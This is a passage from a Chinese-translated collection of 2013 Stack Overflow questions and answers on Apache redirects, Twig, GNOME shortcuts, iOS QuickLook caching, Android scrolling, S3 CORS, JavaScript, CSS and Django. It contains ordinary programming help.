Redirect 301 /plant/attachments.asp /catalog/plant/attachments/ 
```

任何想法为什么？

LG

完整的.htaccess：

```
# Friendly URLs Part
RewriteEngine On
RewriteBase /
RewriteCond %{HTTP_HOST} .
# Force all pages to go to www.domain.com for SEO
RewriteCond %{HTTP_HOST} !^www\. [NC]
RewriteRule (.*) http://www.%{HTTP_HOST}/$1 [R=301,L]
# Friendly URLs
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php?q=$1 [L,QSA]
# ASP Redirects
RewriteRule ^plant/attachments\.asp$ catalog/plant/attachments/[R=302,L]
# Additional Settings Follow
ExpiresActive On
ExpiresByType image/gif A2592000
ExpiresByType image/jpeg A2592000
ExpiresByType image/png A2592000
BrowserMatch "MSIE" brokenvary=1
BrowserMatch "Mozilla/4.[0-9]{2}" brokenvary=1
BrowserMatch "Opera" !brokenvary
SetEnvIf brokenvary 1 force-no-vary 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T15:43:16.130

我看到很多人对这种方法有问题。大多数使用`mod_rewrite`：

```
RewriteEngine On
RewriteBase /
RewriteRule ^plant/attachments\.asp$ catalog/plant/attachements/ [R=301,L] 
```

或者，我认为这`Redirect`需要一个绝对目标路径：

```
Redirect 301 /plant/attachments.asp http://contractorshire.co.uk/catalog/plant/attachments/ 
```

# php - 树枝过滤器包括模板

> ID：16122091
> 
> 赞同：4
> 
> 时间：2013-04-20T15:33:59.430
> 
> 标签：php, twig, template-engine

我想做这样的事情：

```
{{ include("tpl.html")|f }} 
```

但这似乎不起作用，它只是在`tpl.html`没有任何过滤的情况下打印，然后我尝试了：

```
{% filter f %}
    {% include "tpl.html" %}
{% endfilter %} 
```

它奏效了。我只是想知道，为什么我不能使用更短的？我误解了什么吗？提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T15:42:42.487

抱歉这么久才回来:-)

事实是`include`函数写在模板上。

如果你这样做：

```
{% set s = include('FuzHomeBundle:Default:test.html.twig') %} 
```

不应该显示的东西，无论如何你都会得到文件输出的内容，并且`s`变量将被设置为`null`.

如果你这样做：

```
{% filter upper %}
{% include 'FuzHomeBundle:Default:test.html.twig' %}
{% endfilter %} 
```

或者

```
{% filter upper %}
{{ include('FuzHomeBundle:Default:test.html.twig' }}
{% endfilter %} 
```

该`filter`标签将编译一些控制输出缓冲区的代码。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-22T16:48:51.467

要对一段代码应用过滤器，您必须用过滤器标签包装它：

```
{% filter f %}
    ...
{% endfilter %} 
```

您最初尝试的是过滤一个变量，该变量在 twig 中由双括号定义：

```
{{ variable name|filter }} 
```

[要阅读更多内容，请在此处查看](http://twig.sensiolabs.org/doc/tags/filter.html)有关过滤器的 twig 文档

# emacs - 如何防止 Gnome 拦截 Alt+Shift+~ 键？

> ID：16122092
> 
> 赞同：3
> 
> 时间：2013-04-20T15:34:14.943
> 
> 标签：emacs, debian, keyboard-shortcuts, gnome

我经常想在使用 emacs 时键入 Alt+Shift+~（运行它的命令“未修改”）。但是，自从升级到 Debian Wheezy（将 Gnome 升级到 3.4）后，我发现当我键入这些键时，Emacs 不会“听到”击键；相反，我看到一个弹出窗口，看起来就像我按 Alt+TAB 时看到的窗口（除了这个窗口只有一个图标，对于 Emacs，而不是 Alt+TAB 显示的窗口，它有每个应用程序一个图标）。

我已经以明显的方式修复了许多类似的被盗击键问题：我在屏幕右上角单击我的名字，从下拉菜单中选择“系统设置”；单击“键盘”图标，单击“快捷方式”选项卡，然后检查右侧的每个条目，看是否是有罪的一方；如果是这样，我禁用它。但是，在这种特殊情况下，我找不到任何引用波浪号或反引号键的条目，所以我不知道要删除什么。

我还尝试检查 的输出，`gconftool-2 --recursive-list`看看我是否能找到任何可能的东西，但没有看到任何相关的东西。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-20T15:50:34.700

一些勤奋的谷歌搜索“gnome alt backtick”发现了这个：

```
gsettings set org.gnome.desktop.wm.keybindings switch-group "['disabled']" 
```

我在[https://bugs.launchpad.net/unity-2d/+bug/992928/comments/4找到它](https://bugs.launchpad.net/unity-2d/+bug/992928/comments/4)

# ios - 防止 iOS QuickLook 生成缓存

> ID：16122095
> 
> 赞同：9
> 
> 时间：2013-04-20T15:34:31.623
> 
> 标签：ios, objective-c, caching, quicklook

我在我的 iOS 应用程序中使用[QuickLook 框架来预览各种文件。](http://developer.apple.com/library/ios/#documentation/QuickLook/Reference/QuickLookFrameworkReference_iPhoneOS/_index.html)我最近注意到 QuickLook 在我的应用程序`tmp`目录中保留了所有预览文件的缓存。不过 QuickLook 缓存文件有两个问题：

1.  这些缓存文件已经存储在 Documents 目录中。所以理论上，如果用户想要预览他们的所有文件（他们可能会这样做），应用程序的大小可能会翻倍。好的，没什么大不了的，我可以使用以下代码定期清理缓存：

    ```
    NSFileManager *fileMgr = [NSFileManager defaultManager];
    NSArray *fileArray = [fileMgr contentsOfDirectoryAtPath:NSTemporaryDirectory() error:nil];
     for (NSString *filename in fileArray)  {
        [fileMgr removeItemAtPath:[NSTemporaryDirectory() stringByAppendingPathComponent:filename] error:NULL];
    } 
    ```

2.  第二个也是**最重要的问题**是 QuickLook 似乎是在系统文件夹（不是我的应用程序）中创建二级缓存。这是一个问题，因为用户可以选择加密我的应用程序中的单个文件。如果他们在加密之前预览文件，它看起来很正常。如果他们加密然后预览，文件仍然显示为好像未加密。我知道加密没有问题，因为存储在我的应用程序`Documents`目录中的加密文件已加密，任何程序都无法（正确）读取。这是一个主要问题，因为它可能导致用户认为文件未加密。这也是一个安全问题，因为这意味着 QuickLook 正在将文件缓存在其他地方。

这是我的快速查看代码：

```
- (NSInteger)numberOfPreviewItemsInPreviewController:(QLPreviewController *)controller {
    return 1;
 }

- (id <QLPreviewItem>)previewController:(QLPreviewController *)controller previewItemAtIndex:(NSInteger)index {
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    //Get the stored user data and file name
    NSString *FileName = [defaults objectForKey:@"FileName"]; //Name of file stored in NSUserDefaults
    NSString *finalFilePath = [documentsDirectory stringByAppendingPathComponent:FileName];

    return [NSURL fileURLWithPath:finalFilePath];
}

- (IBAction)previewFile:(id)sender {
   //Setup QuickLook
   QLPreviewController *previewController = [[QLPreviewController alloc] init];
   previewController.delegate=self;
   previewController.dataSource=self;
   previewController.currentPreviewItemIndex = 0;
   [previewController reloadData];
   [self presentModalViewController:previewController animated:YES];
   [previewController.navigationItem setRightBarButtonItem:nil];
} 
```

有谁知道 QuickLook 缓存在哪里，或者是否有一个（可能是某种错误）？

**如何防止 QuickLook 缓存文件，或者如何重置缓存？**如果这些都不可能，是否有 iOS 6 替代 QuickLook（我听说 QuickLook 在 iOS 6 中已更改，因此没有任何解决方法、替代方案等）？

任何解决方案或想法表示赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-30T14:24:51.037

也许尝试 NSURLCache 看看是否有帮助。

在应用程序 didfinishlaunchingwithoptions 中设置它：

```
int cacheSizeMemory = 8*1024*1024; // 8MB
int cacheSizeDisk = 16*1024*1024; // 16MB
NSURLCache *sharedCache = [[NSURLCache alloc] initWithMemoryCapacity:cacheSizeMemory   diskCapacity:cacheSizeDisk diskPath:@"nsurlcache"];
[NSURLCache setSharedURLCache:sharedCache]; 
```

然后当你想清空缓存时可以执行以下操作

```
[[NSURLCache sharedURLCache] removeAllCachedResponses]; 
```

我不知道这是否适用于快速浏览，但值得一试。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-30T12:26:26.317

我相信您可以使用以下命令从命令提示符重置整个缓存：

```
qlmanage -r cache 
```

或使用以下命令生成特定文档的预览：

```
qlmanage -p document.ext 
```

但是因为这是一个命令行解决方案，所以这可能不是您所需要的。不过，祝你好运。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-30T12:25:02.033

如果没有办法阻止 QLPreviewController 进行自己的缓存，您可能需要考虑使用 UIWebView 制作自己的版本 QLPreviewController（因为它能够查看许多文件类型，例如 PDF、文档、xls 等）。

这绝不是一个理想的解决方案，你不会有任何接近 QLPreviewController 将提供的性能/UI 质量水平。是的......这是一个有点被黑的解决方案，但缺少一个公共 API 来清除二级缓存......这是我唯一能想到的。

我想这是用户友好性+安全性之间的折腾。

祝你好运！

# python - re.sub 中的评估代码与 php 中一样

> ID：16122099
> 
> 赞同：0
> 
> 时间：2013-04-20T15:35:19.543
> 
> 标签：python

在PHP中可以做到

```
$str = preg_replace("~^(<.*?>)([0-9a-zа-яё]){1}(.*?)~eu", "'$1 '.mb_strtoupper('$2', 'UTF-8').'$3'", $str); 
```

我怎么能在python中做到这一点？

我试试这个，但它没有工作..

```
str=re.sub("~^(<.*?>)([0-9a-zа-яё]){1}(.*?)~eu", "\\1 \\2.upper()\\3") 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T15:47:22.880

使用可以执行任意函数的字符串存在安全风险。相反，您可以提供一个函数而不是一个字符串来完成整个事情。

```
def repl(match):
    return "{0} {1}{2}".format(match.group(1), match.group(2).upper(), match.group(3))

text = re.sub("~^(<.*?>)([0-9a-zа-яё]){1}(.*?)~eu", repl, text) 
```

另外，请注意，这`str`不是一个好的字符串名称，因为它会隐藏`str`内置函数。

# android - 处理 D-Pad 的 onScrollChange 和自定义 Horizo ntalScrollView 的 Touch

> ID：16122102
> 
> 赞同：0
> 
> 时间：2013-04-20T15:35:27.653
> 
> 标签：android, google-tv

我正在研究一个带中心锁的 Horizo​​ntalScrollview。它基于此 stackoverflow 线程中的一些代码：

[Horizo​​ntalScrollView 与 imageviews 作为一个孩子，而在屏幕中滚动图像的中心应该播放动画？](https://stackoverflow.com/questions/11345673/horizontalscrollview-with-imageviews-as-a-child-and-while-scrolling-the-center-o)

问题是它没有正确支持方向键导航。它不会滚动到下一个项目，而是跳转位置。我修改了代码，使其正确地与 D-Pad 导航一起使用，但这使得 Touch 滚动不起作用。同样出于某种原因，即使正确添加了 TextView，点击侦听器似乎也被删除了。无论如何，现在的主要问题是，如果我重新添加 onScrollChange 事件的代码，它对 Touch 正常工作，但是如果项目不在屏幕上，则 D-Pad 导航可以跳过一个项目，然后再回到屏幕上。

以下是正在使用的 xml.layout：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/mainLayout"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@drawable/serenity_bonsai_logo"
    android:orientation="vertical"
    tools:context=".MainActivity" >

    <LinearLayout
       android:id="@+id/main_menu_row1"
       android:layout_width="fill_parent"
       android:layout_height="wrap_content"
       android:layout_alignParentTop="true"
       android:orientation="horizontal" >

       <DigitalClock
           android:layout_width="wrap_content"
           android:layout_height="wrap_content"
           android:background="#50000000"
           android:textColor="#F0F0F0"
           android:textSize="20sp" />
    </LinearLayout>

    <us.nineworlds.serenity.widgets.CenterLockHorizontalScrollview
        android:id="@+id/mainGalleryMenu"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:background="#50000000"
        android:layout_centerInParent="true"
        android:clickable="true"
        android:scrollbars="none" >

        <LinearLayout
           android:layout_width="fill_parent"
           android:layout_height="150dp"
           android:layout_gravity="center_vertical"
           android:background="@android:color/transparent"
           android:orientation="horizontal"
           android:clickable="true" >
        </LinearLayout>
     </us.nineworlds.serenity.widgets.CenterLockHorizontalScrollview>

</RelativeLayout> 
```

我知道问题在于 onScrollChange 方法以及它如何计算应该是新的中心视图，但不确定如何让 D-Pad 和触摸滚动很好地一起播放。这是CenterLockHorizo​​ntalScrollView 类的相关代码。

```
public class CenterLockHorizontalScrollview extends HorizontalScrollView {
private ListAdapter mAdapter;

private int mCenterViewPosition = -1;
private MenuDataSetObserver menuDataObserver;
private OnItemSelectedListener selectedItemListener;
private boolean keypadScrollEvent = false;

public CenterLockHorizontalScrollview(Context context, AttributeSet attrs) {
    super(context, attrs);

    this.setHorizontalFadingEdgeEnabled(true);
    this.setHorizontalScrollBarEnabled(false);
    this.setFadingEdgeLength(5);
    this.setSmoothScrollingEnabled(true);
}

@Override
protected void onLayout(boolean changed, int l, int t, int r, int b) {

    super.onLayout(changed, l, t, r, b);

    if (getChildCount() == 0) {
        return;
    }

    initCenterView();
}

@Override
protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
    super.onMeasure(widthMeasureSpec, heightMeasureSpec);

    if (getChildCount() == 0)
        return;

    ViewGroup parent = (ViewGroup) getChildAt(0);

    if (parent.getChildCount() == 0)
        return;

    View FirstChild = parent.getChildAt(0);

    int LeftPadding = (getWidth() / 2)
            - (FirstChild.getMeasuredWidth() / 2);

    View LastChild = parent.getChildAt(getChildCount() - 1);

    int RightPadding = (getWidth() / 2)
            - (LastChild.getMeasuredWidth() / 2);

    if (parent.getPaddingLeft() != LeftPadding
            && parent.getPaddingRight() != RightPadding) {
        parent.setPadding(LeftPadding, parent.getPaddingTop(),
                RightPadding, parent.getPaddingBottom());
        requestLayout();
    }
}

/* (non-Javadoc)
 * @see android.view.View#onKeyDown(int, android.view.KeyEvent)
 */
@Override
public boolean onKeyDown(int keyCode, KeyEvent event) {
    int totalItems = 0;
    if (mAdapter.getCount() > 0) {
        totalItems = mAdapter.getCount();
    }

    int currentPosition = mCenterViewPosition;

    if (keyCode == KeyEvent.KEYCODE_DPAD_LEFT) {
        if (currentPosition > 0) {
            setSelectedIndex(currentPosition - 1);
        } else {
            setSelectedIndex(totalItems - 1);
        }
        keypadScrollEvent = true;
        scrollToSelectedIndex();
        keypadScrollEvent = false;
        return true;
    }

    if (keyCode == KeyEvent.KEYCODE_DPAD_RIGHT) {
        if (currentPosition < totalItems - 1) {
            setSelectedIndex(currentPosition + 1);
        } else {
            setSelectedIndex(0);
        }
        keypadScrollEvent = true;
        scrollToSelectedIndex();
        keypadScrollEvent = false;
        return true;
    }

    if (keyCode == KeyEvent.KEYCODE_DPAD_CENTER ||
        keyCode == KeyEvent.KEYCODE_ENTER) {
        ViewGroup parent = (ViewGroup) getChildAt(0);
        View view = parent.getChildAt(mCenterViewPosition);
        view.setOnClickListener(new GalleryOnClickListener(view.getContext()));
        view.performClick();
        return true;
    }
    return super.onKeyDown(keyCode, event);
}

private int getCenterPositionFromView() {

    int scrollingCenterView = getScrollingCenterView();
    if (mCenterViewPosition != scrollingCenterView) {
        ViewGroup parent = (ViewGroup) getChildAt(0);
        View view = parent.getChildAt(scrollingCenterView);
        selectedItemListener.onItemSelected(view, scrollingCenterView, scrollingCenterView);
        mCenterViewPosition = scrollingCenterView;
    }

    return scrollingCenterView;
}

private int getScrollingCenterView() {
     if(getChildCount() == 0)
            return -1;

        int centerView= 0;
        int centerX = getScrollX() + (getWidth() / 2); 

        ViewGroup parent = (ViewGroup) getChildAt(0);

        if(parent.getChildCount() == 0)
            return -1;

        View child = parent.getChildAt(0);

        while(child != null && child.getRight() <= centerX && centerView < parent.getChildCount())
        {
            centerView++;
            child = parent.getChildAt(centerView);
        }

        if(centerView >= parent.getChildCount()) {
            centerView = parent.getChildCount() - 1;
        }

        return centerView;      

}

public int getCenterViewPosition() {
    return mCenterViewPosition;
}

public ListAdapter getAdapter() {
    return mAdapter;
}

public void setAdapter(ListAdapter mAdapter) {

    this.mAdapter = mAdapter;
    if (menuDataObserver != null) {
        mAdapter.unregisterDataSetObserver(menuDataObserver);
    }
    mAdapter.registerDataSetObserver(new MenuDataSetObserver());
}

private void fillViewWithAdapter() {
    if (getChildCount() == 0 || mAdapter == null)
        return;

    ViewGroup parent = (ViewGroup) getChildAt(0);

    parent.removeAllViews();

    for (int i = 0; i < mAdapter.getCount(); i++) {
        parent.addView(mAdapter.getView(i, null, parent));
    }
    setSelectedIndex(0);
}

@Override
protected void onScrollChanged(int l, int t, int oldl, int oldt) {
    super.onScrollChanged(l, t, oldl, oldt);

    if (keypadScrollEvent == false) {
        getCenterPositionFromView();
    }
    initCenterView();
}

private void initCenterView() {
    Log.i(getClass().getName(), "initCenterView");

    if (getChildCount() == 0)
        return;

    ViewGroup parent = (ViewGroup) getChildAt(0);

    if (parent.getChildCount() == 0)
        return;

    int centerView = getCenterViewPosition();

    if (centerView == -1) {
        mCenterViewPosition = 0;
        centerView = 0;
    }

    if (centerView != -1 && centerView != mCenterViewPosition
            && parent.getChildAt(0).getLeft() >= 0) {
        scrollToSelectedIndex();
    }

    if (centerView < 0 || centerView > parent.getChildCount())
        return;

    for (int i = 0; i <= parent.getChildCount(); i++) {

        if (! (parent.getChildAt(i) instanceof TextView)) {
            continue;
        }

        if (i == centerView) {
            // Start Animation
            //setSelectedIndex(i);
            //scrollToSelectedIndex();
            return;
        } else {
            // Remove Animation for other Views
        }
    }

}

public int getSelectedIndex() {
    return getCenterViewPosition();
}

public void setSelectedIndex(int index) {
    Log.i(getClass().getName(), "setSelectedIndex");

    if (getChildCount() == 0)
        return;

    ViewGroup parent = (ViewGroup) getChildAt(0);

    if (index < 0 || index > parent.getChildCount()) {
        throw new ArrayIndexOutOfBoundsException(index);
    }

    mCenterViewPosition = index;

    //onSelectedItemChanged.onSelectedChanged(this, mCenterViewPosition);
    selectedItemListener.onItemSelected(parent.getChildAt(index), index, 0); 

    requestLayout();
}

protected void scrollToSelectedIndex() {

    ViewGroup parent = (ViewGroup) getChildAt(0);

    View child = parent.getChildAt(mCenterViewPosition);

    if (child == null) {
        return;
    }

    int offsetX = ((child.getLeft() + child.getRight()) / 2) - (this.getWidth() / 2);

    smoothScrollTo(offsetX, 0);
}

public class MenuDataSetObserver extends DataSetObserver {

    @Override
    public void onChanged() {
        fillViewWithAdapter();
    }

}

public OnItemSelectedListener getOnItemSelectedListener() {
    return selectedItemListener;
}

public void setOnItemSelectedListener(OnItemSelectedListener selectedItemListener) {
    this.selectedItemListener = selectedItemListener;
}
} 
```

如果不检查 onScrollChange 中的中心，D-Pad 导航可以正常工作，但触摸滚动不能。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T17:27:42.183

我的建议是不要覆盖 onKeyDown 事件，而是附加一个 onClickListener。您是否考虑过使用 ViewPager 代替您覆盖 ViewPager 宽度以考虑其中包含的项目？

# jquery - 在 Chrome 上跨域 AJAX 到 Amazon S3

> ID：16122103
> 
> 赞同：2
> 
> 时间：2013-04-20T15:35:28.643
> 
> 标签：jquery, ajax, amazon-web-services, amazon-s3

以下请求适用于 Firefox，但不适用于 Chrome：

```
$.ajax({
    url:'http://pucquepariu.s3.amazonaws.com/exercicios/1/INF1005-Site-1-1-solucao.c?1366303788',
    success:function(data){
        alert(data)
    }
}) 
```

这是我在 Amazon AWS S3 存储桶上的 CORS 配置：

```
<?xml version="1.0" encoding="UTF-8"?>
<CORSConfiguration xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
    <CORSRule>
        <AllowedOrigin>*</AllowedOrigin>
        <AllowedMethod>GET</AllowedMethod>
        <AllowedHeader>Content-Type,Depth,User-Agent,X-File-Size,X-Requested-With,If-Modified-Since,X-File-Name,Cache-Control</AllowedHeader>
    </CORSRule>
</CORSConfiguration> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T23:27:39.793

知道了！

`crossDomain: true`必须在 ajax 调用上使用该选项：

```
$.ajax({
    url:'http://pucquepariu.s3.amazonaws.com/exercicios/1/INF1005-Site-1-1-solucao.c?1366303788',
    crossDomain: true,
    success:function(data){
        alert(data)
    }
}) 
```

# android - 移动应用程序的服务器端同步代码

> ID：16122106
> 
> 赞同：0
> 
> 时间：2013-04-20T15:35:34.980
> 
> 标签：android, ios, windows-phone-7, blackberry

我们正计划开发一种云服务，在该服务中，任何需要将数据同步到服务器的移动应用程序都可以在公共主机上开箱即用。这将使用 NoSQL 数据库完成，因此任何数据都可以轻松保存，并且只需要 HTTP/JSON 通信。

大多数移动开发人员都在使用这个领域的现成解决方案吗？

我们想就这是否可以帮助移动开发者征求您的意见？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T15:58:10.673

对于 iOS，有一个叫做[RestKit](https://www.google.co.in/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CDUQFjAA&url=http%3A%2F%2Frestkit.org%2F&ei=_7hyUfHjGMX5rAfj0oC4Ag&usg=AFQjCNEZpFyLIv9sJOPi6Zu3m7z9hndu_w&sig2=CLi62yPyNcGZV75uhRhvvA&bvm=bv.45512109,d.bmk)的东西可以自动获取响应，解析它并给你一个动态对象。它适用于各种服务器和响应类型。希望这会有所帮助，对于服务器端配置，您可以使用[Apigee](https://www.google.co.in/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&ved=0CD0QjBAwAQ&url=http%3A%2F%2Fapigee.com%2Fabout%2Fpressrelease%2Fapigee-study-mobile-app-dependency-high-varies-country&ei=pLpyUbDQDsb4rQfa8YG4AQ&usg=AFQjCNEkeMC2BccF48MlOXN42pKuxM2z5w&sig2=KY5D13K2aJaf2hGs0NVgjA&bvm=bv.45512109,d.bmk)来做类似的事情。我在这两个方面都做过，所以认为它对你有用。

# c++ - C++ 9x9 单元板球运动路径检查

> ID：16122109
> 
> 赞同：-3
> 
> 时间：2013-04-20T15:35:44.527
> 
> 标签：c++, algorithm, recursion, path-finding

有一个带有不同颜色球的 9x9 单元板（二维阵列）。玩家可以将球从一个单元格移动到另一个单元格。球可以在当前单元格和目标单元格之间的单元格上以没有球的路径移动。

我只认为我必须使用重复来实现此路径检查。但我不知道如何实现这个功能。

我曾尝试实现该功能。但我知道它会导致无限循环。

```
bool board::moveCheck(int x1, int y1, int x2, int y2)
{
    if(x1==x2&&y1==y2)
        return true;
    else if(y1-1>=0)
        board::moveCheck(x1,y1-1,x2,y2);
    else if(y1+1<9)
        board::moveCheck(x1,y1+1,x2,y2);
    else if(x1-1>=0)
        board::moveCheck(x1-1,y1+1,x2,y2);
    else if(x1+1<9)
        board::moveCheck(x1+1,y1+1,x2,y2);
    else
        return false;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:02:20.113

你的代码有很多问题，很难看到如何在不完全重写的情况下修复它。这里有几个指针：

1.  当你递归调用函数时，你需要对返回值做一些事情。此刻你正在把它扔掉。

2.  您的代码具有[未定义的行为](https://stackoverflow.com/questions/9936011/if-a-function-returns-no-value-with-a-valid-return-type-is-it-okay-to-for-the)，因为它并不总是返回值。考虑 的情况`y1 - 1 >= 0`。您将调用`moveCheck()`，丢弃返回值（假设它甚至完全返回），然后退出条件块，此时函数结束，不返回任何内容。

3.  您有一个似乎不检查任何成员变量的成员函数。你在哪里检查路径中是否有障碍物？

4.  不完全清楚`x1`, `y1`,`x2`和`y2`是什么。要么给他们自我记录的名字，要么提供记录注释。我猜它们是源坐标和目的地坐标，但不清楚你为什么要相互比较它们，如果它是你感兴趣的路径中存在的球。

# math - 具有类似珍珠树界面的 Web 应用程序

> ID：16122110
> 
> 赞同：2
> 
> 时间：2013-04-20T15:36:03.307
> 
> 标签：math, editor

Pearltree[网站](http://www.pearltrees.com/)有一个有趣的界面。我会对在线编辑器的库（Java、Python、HTML5？）这样的界面感兴趣。

该项目使用[Flex](http://www.adobe.com/products/flex.html)，并在[这篇旧博客文章](http://blog.pearltrees.com/?page_id=12494)中指出 HTML5 的性能更差。

我在[math.stackexchange.com上的](https://math.stackexchange.com/)[另一个问题的背景下问这个问题](https://math.stackexchange.com/questions/367411/online-math-tool-for-equation-visualisation)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-11-15T22:40:34.227

您可能想尝试 D3 JS [http://d3js.org/](http://d3js.org/)

这是使用 D3 和节点的示例， http: [//mbostock.github.io/d3/talk/20111116/force-collapsible.html](http://mbostock.github.io/d3/talk/20111116/force-collapsible.html)

![在此处输入图像描述](https://i.stack.imgur.com/aLvar.jpg)

# javascript - 如何在没有排序的情况下删除 Javascript 数组中的重复项

> ID：16122115
> 
> 赞同：3
> 
> 时间：2013-04-20T15:36:15.190
> 
> 标签：javascript, arrays, duplicates

所以我正在制作一个游戏，它根据两个人名字中的字母和爱这个词来计算爱情百分比。

在下面的代码中，我计算一个字母出现在值数组中的次数，然后我想将此值推送到每个唯一字母的 nums 数组中。但是我不确定每次字母出现在值数组中时如何让它不重复。我也无法对数组进行排序，否则游戏将无法正确计算。

因此，例如，下面的值数组应该只将 3 for s 推送到 nums 数组中一次。

```
var value =["s", "a", "m", "a", "n", "t", "h", "a", "w", "h", "i", "t", "e", "l", "o", "v", "e", "s", "J", "a", "c", "k", "h", "a", "r", "r", "i", "s"]; 

function trueLoveGame(value){

    var nums=[];

    for(var i =0; i < value.length;i++){
        var count = 0;
        for(var a = 0; a < value.length;a++){
            if(value[i] === value[a]){  
                count++;
            }
            else{

            }
        }   
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T15:53:36.163

所以不清楚到底需要什么。这应该回答我认为您可能会问的两种可能性。

```
var userArray = ["s", "a", "m", "a", "n", "t", "h", "a", "w", "h", "i", "t", "e", "l", "o", "v", "e", "s", "J", "a", "c", "k", "h", "a", "r", "r", "i", "s"];

function unique(array) {
    var unique = [];

    array.forEach(function (value) {
        if (unique.indexOf(value) === -1) {
            unique.push(value);
        }
    });

    return unique;
}

function count(array) {
    var obj = {};

    array.forEach(function (value) {
        obj[value] = (obj[value] || 0) + 1;
    });

    return obj;
}

console.log(userArray);
console.log(unique(userArray));
console.log(count(userArray)); 
```

在[jsfiddle上](http://jsfiddle.net/Xotic750/cJyfh/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T15:47:44.440

我不确定您是否需要获取键值对。您可以尝试以下给出的方法来获取字母计数对的对象。

```
function trueLoveGame(value){

    var nums={};

    for(var i =0; i < value.length;i++){
       var letter = value[i];
       nums[letter] =   nums[letter] || 0;
       nums[letter]++;
    }

    return nums;
} 
```

# html - 使用 html 或 css 悬停图像

> ID：16122125
> 
> 赞同：1
> 
> 时间：2013-04-20T15:37:43.857
> 
> 标签：html, css, image, hover

当我将鼠标悬停在页面上时，我试图更改页面上的图像。我也看到了很多关于这个的例子，但我仍然无法完成这项工作。谁能告诉我我哪里出错了？

这是html我的代码：-

```
 <body>
        <a id="swap"> </a>
    </body> 
```

CSS：-

```
 #swap {
        background-image:url('slide1.jpg');
    }

#swap:hover {
    background-image:url('slide2.jpg');
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T15:47:04.630

这有效

```
#swap {
   display: block;
   background: url('http://lorempixel.com/output/cats-q-c-100-100-8.jpg') no-repeat; 
}
#swap:hover {
   background: url('http://lorempixel.com/output/catsq-c-100-100-9.jpg') no-repeat;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T15:46:53.330

尝试这个：

```
<style type="text/css">
#swap {
    display:block;
    position:relative;
    height:100px;
    width: 200px;
    background-image: url(slide1.jpg);
    background-repeat:no-repeat;
    }

#swap:hover {
    background-image: url(slide2.jpg);
    background-repeat:no-repeat;
} 
</style>

<body>

     <a href=""><div id="swap"></div></a>

</body> 
```

更改`width`和`height`您的图像尺寸。这个解决方案有效，我测试过。

# cluster-computing - hornetq 集群是否旨在应对丢失 1 个或多个节点？

> ID：16122126
> 
> 赞同：0
> 
> 时间：2013-04-20T15:37:50.567
> 
> 标签：cluster-computing, high-availability, hornetq

我知道有带有主/备份设置的 HornetQ HA。但我想在非主设置中运行 HornetQ 并自己处理重复的消息。

集群设置看起来非常适合这个，但我没有看到任何暗示它能够满足这些要求的能力。失败节点的客户端会发生什么？他们是否连接到其他服务器？重新启动/修复的节点是否能够重新加入集群并继续分发其持久消息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:04:04.967

客户端上的故障转移目前需要一个备份节点。如果无法进入其他节点，您将不得不手动重新连接。

示例：获取连接工厂并在那里连接。

# python - 在 Django 1.5 中建模多个字段查找

> ID：16122128
> 
> 赞同：0
> 
> 时间：2013-04-20T15:38:02.327
> 
> 标签：python, django, url, slug, permalinks

我有一个模型

```
class ModelName(models.Model):
    type = models.ForeignKey(AnotherModel)
    slug = models.SlugField(editable=False)

    class Meta:
        unique_together = (('type', 'slug'),)

    @models.permalink
    def get_absolute_url(self):
        return ('model_detail', (), {'type': self.type.slug, 'slug': self.slug}) 
```

和网址

```
urlpatterns = patterns('',
    url(r'^(?P<type>[-\w]+)/(?P<slug>[-\w]+)/$', ModelDetailView.as_view(), name='detail'),
) 
```

和一个 DetailView

```
class ModelDetailView(DetailView):
    model = MyModel
    template_name = 'detail.html' 
```

但我得到了异常 MultipleObjectsReturned 因为蛞蝓不是唯一的。我希望 url 是`/type/slug/`，因此模型可以包含两条具有相同 slug 但类型不同的记录，因此 url 可能是`/1/slug/`并且`/2/slug/`具有不同的结果。如何告诉模型同时使用类型和 slug 作为查找，而不仅仅是 slug？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T16:06:14.583

您不必“告诉模型”使用类型和字符串字段——这是您必须覆盖的基于类的视图。

我建议您重写该`get_queryset`方法，以将查询集限制为正确类型的对象。另一种方法是覆盖该`get_object`方法。

```
class ModelDetailView(DetailView):
    model = MyModel
    template_name = 'detail.html'

    def get_queryset(self):
        """
        Restrict queryset to objects of the correct type
        """
        return MyModel.objects.filter(type_id=self.kwargs['type']) 
```

有关更多详细信息，请参阅有关[动态过滤](https://docs.djangoproject.com/en/1.5/topics/class-based-views/generic-display/#dynamic-filtering)的 Django 文档。

# vim - Vim 键映射无法正常工作，因为 Ctrl 键不工作

> ID：16122129
> 
> 赞同：0
> 
> 时间：2013-04-20T15:38:13.100
> 
